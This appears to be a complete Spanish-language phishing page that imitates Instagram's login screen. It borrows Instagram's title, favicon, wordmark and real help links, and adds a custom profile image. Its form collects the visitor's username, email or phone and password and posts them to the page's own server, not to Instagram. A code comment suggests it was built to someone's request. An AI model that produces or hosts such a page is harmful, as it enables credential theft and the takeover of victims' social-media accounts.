<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión • Instagram</title>
    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon-192.png/b407fa10731e.png">
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #fafafa; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            margin: 0; 
        }

        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 350px;
        }

        .login-box { 
            background: white; 
            border: 1px solid #dbdbdb; 
            width: 100%; 
            padding: 10px 40px; 
            text-align: center; 
            box-sizing: border-box; 
            margin-bottom: 10px;
            border-radius: 1px;
        }

        /* Estilo para el icono circular que pediste */
        .profile-icon {
            width: 85px;
            height: 85px;
            margin: 25px auto 10px;
            display: block;
            border-radius: 50%;
            object-fit: cover;
            border: 1px solid #dbdbdb;
        }

        .logo-text { 
            width: 175px; 
            margin: 10px auto 12px; 
            display: block; 
        }

        .form-container { margin-top: 10px; }

        input { 
            width: 100%; 
            padding: 9px; 
            margin-bottom: 6px; 
            border: 1px solid #dbdbdb; 
            background: #fafafa; 
            border-radius: 3px; 
            box-sizing: border-box; 
            font-size: 12px; 
            color: #262626;
        }

        input:focus { 
            border: 1px solid #a8a8a8; 
            outline: none; 
        }

        button { 
            width: 100%; 
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #4c5fd7 100%); 
            border: none; 
            color: white; 
            padding: 7px 9px; 
            border-radius: 4px; 
            font-weight: 600; 
            font-size: 14px; 
            cursor: pointer; 
            margin-top: 8px; 
            margin-bottom: 20px; 
        }

        button:active { opacity: 0.8; }

        .forgot { 
            font-size: 12px; 
            color: #00376b; 
            text-decoration: none; 
            display: block;
            margin-bottom: 15px;
        }

        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            width: 100%;
            padding: 20px;
            text-align: center;
            box-sizing: border-box;
            font-size: 14px;
            border-radius: 1px;
        }

        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        @media (max-width: 450px) {
            body { background-color: white; }
            .login-box, .signup-box { border: none; }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="login-box">
            <img src="https://i.postimg.cc/fb17P58L/images.jpg" class="profile-icon" alt="Profile Icon">
            
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511109452.png" class="logo-text" alt="Instagram">
            
            <div class="form-container">
                <form id="login-form" action="/" method="POST">
                    <input type="text" name="user_id" placeholder="Teléfono, usuario o correo electrónico" required>
                    <input type="password" name="user_pass" placeholder="Contraseña" required>
                    <button type="submit">Iniciar sesión</button>
                </form>
            </div>
            
            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot">¿Olvidaste tu contraseña?</a>
        </div>

        <div class="signup-box">
            <span>¿No tienes una cuenta? <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-link">Regístrate</a></span>
        </div>
    </div>
</body>
</html>
